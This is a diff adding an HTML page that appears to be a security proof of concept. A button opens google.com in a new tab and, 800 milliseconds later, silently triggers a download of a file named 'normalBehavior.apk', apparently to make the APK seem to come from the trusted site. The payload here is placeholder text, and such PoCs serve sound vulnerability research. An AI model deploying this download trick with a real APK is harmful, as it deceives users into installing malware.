@@ -1,0 +1,40 @@
+<!doctype html>
+<html>
+  <body
+    style="
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: sans-serif;
+    "
+  >
+    <div id="ui" style="text-align: center">
+      <h2>Click Below Button</h2>
+      <button
+        id="btn"
+        style="padding: 15px 30px; font-size: 18px; cursor: pointer"
+      >
+        Click Here
+      </button>
+    </div>
+
+    <script>
+      document.getElementById("btn").onclick = () => {
+        window.open("https://google.com", "_blank");
+
+        setTimeout(() => {
+          const blob = new Blob(["PoC File APK"], {
+            type: "application/vnd.android.package-archive",
+          });
+          const url = URL.createObjectURL(blob);
+
+          const a = document.createElement("a");
+          a.href = url;
+          a.download = "normalBehavior.apk";
+          a.click();
+        }, 800);
+      };
+    </script>
+  </body>
+</html>
